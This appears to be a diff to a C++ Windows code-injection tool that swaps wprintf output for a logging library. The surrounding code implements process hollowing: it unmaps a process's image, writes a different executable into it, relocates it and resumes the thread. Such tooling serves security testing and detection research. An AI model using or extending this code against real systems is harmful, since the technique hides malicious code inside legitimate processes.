@@ -6,6 +6,7 @@
 #include "sysapi.h"
 #include "fs.h"
 #include "unique_memory.h"
+#include "logging.h"
 
 
 namespace scripts {
@@ -14,16 +15,16 @@ bool inject_create_process_hollow(const std::wstring& original_image,
                                   const std::wstring& injected_image,
                                   RemoteProcessMemoryMethod method) {
 
-    wprintf(L"\nPreparing a new process\n");
+    bblog::info("[*] Preparing a new process");
 
-    wprintf(L"  [*] creating process...\n");
+    bblog::info("creating process...");
 
     auto process = sysapi::ProcessCreateUser(original_image, true);
     if (process.hProcess == NULL) {
         return false;
     }
 
-    wprintf(L"  [*] getting process PEB address...\n");
+    bblog::info("getting process PEB address...");
 
     PROCESS_BASIC_INFORMATION BasicInfo;
     auto res = sysapi::ProcessGetBasicInfo(process.hProcess.get(), BasicInfo);
@@ -36,8 +37,8 @@ bool inject_create_process_hollow(const std::wstring& original_image,
         return false;
     }
 
-    wprintf(L"\nPreparing the injected image\n");
-    wprintf(L"  [*] mapping image file...\n");
+    bblog::info("[*] Preparing the injected image");
+    bblog::info("mapping image file...");
 
     auto image_mapping = fs::map_file(injected_image.c_str());
     if (image_mapping.handle == NULL) {
@@ -61,14 +62,14 @@ bool inject_create_process_hollow(const std::wstring& original_image,
 
     ctx.Size = pNT32Header->OptionalHeader.SizeOfImage;
 
-    wprintf(L"\nPlacing the new image in the target process\n");
+    bblog::info("[*] Placing the new image in the target process");
 
     if (ctx.method == RemoteProcessMemoryMethod::CreateSectionMap ||
         ctx.method == RemoteProcessMemoryMethod::CreateSectionMapLocalMap) {
 
         ctx.RemoteBaseAddress = process_peb->ImageBaseAddress;
 
-        wprintf(L"  [*] unmapping original process image section...\n");
+        bblog::info("unmapping original process image section...");
 
         res = sysapi::SectionUnmapView(ctx.RemoteBaseAddress, process.hProcess.get());
         if (!res) {
@@ -81,8 +82,8 @@ bool inject_create_process_hollow(const std::wstring& original_image,
         return false;
     }
 
-    wprintf(L"\nWriting new image\n");
-    wprintf(L"  [*] writing headers at 0x%p...\n", process_peb->ImageBaseAddress);
+    bblog::info("[*] Writing new image");
+    bblog::info("writing headers at 0x{:x}...", (uintptr_t)process_peb->ImageBaseAddress);
 
     res = process_write_memory(ctx, 0, image_mapping.data, pNT32Header->OptionalHeader.SizeOfHeaders);
     if (!res) {
@@ -97,7 +98,7 @@ bool inject_create_process_hollow(const std::wstring& original_image,
             continue;
         }
 
-        wprintf(L"  [*] writing %hs section at 0x%p...\n", (char*)pSections[i].Name, PTR_ADD(process_peb->ImageBaseAddress, pSections[i].VirtualAddress));
+        bblog::info("writing {} section at 0x{:x}...", (char*)pSections[i].Name, (uintptr_t)PTR_ADD(process_peb->ImageBaseAddress, pSections[i].VirtualAddress));
 
         res = process_write_memory(ctx, pSections[i].VirtualAddress, PTR_ADD(image_mapping.data, pSections[i].PointerToRawData), pSections[i].SizeOfRawData);
         if (!res) {
@@ -105,14 +106,14 @@ bool inject_create_process_hollow(const std::wstring& original_image,
         }
     }
 
-    wprintf(L"\nRelocating image\n");
+    bblog::info("[*] Relocating image");
 
     res = process_pe_image_relocate(ctx, image_mapping.data);
     if (!res) {
         return false;
     }
 
-    wprintf(L"\nFixing thread\n");
+    bblog::info("[*] Fixing thread");
 
 #if defined(_WIN64)
     if (is_64) {
@@ -125,13 +126,13 @@ bool inject_create_process_hollow(const std::wstring& original_image,
     }
 #endif
 
-    wprintf(L"  [*] resuming thread...\n");
+    bblog::info("resuming thread...");
 
     if (!ResumeThread(process.hThread.get())) {
         return false;
     }
 
-    wprintf(L"\nSuccess\n");
+    bblog::info("[+] Success");
     return true;
 }
 
